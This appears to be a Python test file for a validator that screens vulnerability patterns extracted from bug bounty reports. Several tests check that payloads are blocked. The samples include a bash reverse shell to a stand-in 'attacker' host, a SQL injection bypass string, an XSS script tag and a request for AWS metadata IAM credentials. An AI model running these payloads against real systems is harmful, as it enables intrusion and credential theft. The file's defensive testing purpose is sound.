from extractor.models import ChainPotential, ExtractedPattern, Severity
from extractor.validator import validate_pattern


def _valid_pattern(**overrides) -> ExtractedPattern:
    base = dict(
        source_url="https://h1.com/reports/1",
        source_platform="hackerone",
        vuln_class="ssrf",
        vuln_subtype="cloud-metadata",
        cwe_id="CWE-918",
        affected_feature_type="webhook",
        affected_stack_hints=["aws"],
        behavioral_signal="Outbound request from server to internal IP observed.",
        detection_approach=(
            "Identify endpoints that accept user-supplied URLs as input. Probe whether "
            "the server fetches the URL itself, and check for missing host allow-list "
            "or DNS resolution validation."
        ),
        oob_required=False,
        preconditions=["User-controlled URL", "No host allow-list"],
        root_cause_pattern="Missing host validation on user-supplied URLs",
        chain_potential=ChainPotential.HIGH,
        chain_targets=["info_disclosure"],
        chain_reasoning="Metadata endpoint may expose IAM credentials.",
        severity=Severity.HIGH,
        payout_usd=2500.0,
        is_novel=False,
        novel_description=None,
        extraction_confidence=0.85,
        skipped=False,
        skip_reason=None,
    )
    base.update(overrides)
    return ExtractedPattern(**base)


def test_valid_pattern_passes():
    result = validate_pattern(_valid_pattern())
    assert result.ok is True
    assert result.reason is None


def test_low_confidence_fails():
    p = _valid_pattern(extraction_confidence=0.3)
    result = validate_pattern(p)
    assert not result.ok
    assert "confidence" in result.reason.lower()


def test_short_detection_approach_fails():
    p = _valid_pattern(detection_approach="too short")
    result = validate_pattern(p)
    assert not result.ok
    assert "detection_approach" in result.reason


def test_empty_preconditions_fails():
    p = _valid_pattern(preconditions=[])
    result = validate_pattern(p)
    assert not result.ok
    assert "preconditions" in result.reason


def test_aws_metadata_ip_in_payload_blocked():
    p = _valid_pattern(
        detection_approach="Send a request to 169.254.169.254 to fetch IAM creds; this is a long enough string to pass the length check"
    )
    result = validate_pattern(p)
    assert not result.ok
    assert "prohibited" in result.reason.lower()


def test_sql_injection_payload_blocked():
    p = _valid_pattern(
        detection_approach="Inject ' OR '1'='1-- into the form to bypass authentication; this is intentionally long enough to pass length validation"
    )
    result = validate_pattern(p)
    assert not result.ok


def test_reverse_shell_payload_blocked():
    p = _valid_pattern(
        root_cause_pattern="bash -i >& /dev/tcp/attacker/4444 0>&1",
    )
    result = validate_pattern(p)
    assert not result.ok


def test_xss_script_alert_payload_blocked():
    p = _valid_pattern(
        behavioral_signal='<script>alert(1)</script> rendered in profile field',
    )
    result = validate_pattern(p)
    assert not result.ok


def test_skipped_pattern_passes_with_reason():
    p = _valid_pattern(skipped=True, skip_reason="Report contained only a title.")
    result = validate_pattern(p)
    assert result.ok


def test_skipped_pattern_without_reason_fails():
    p = _valid_pattern(skipped=True, skip_reason=None)
    result = validate_pattern(p)
    assert not result.ok


def test_unknown_vuln_class_flags_novel():
    p = _valid_pattern(vuln_class="never_seen_before_class")
    result = validate_pattern(p)
    # Validator allows it but signals that novel flag should be set
    assert result.ok
    assert result.novel_flag_should_set is True


def test_novel_flag_requires_description():
    p = _valid_pattern(is_novel=True, novel_description=None)
    result = validate_pattern(p)
    assert not result.ok
    assert "novel_description" in result.reason
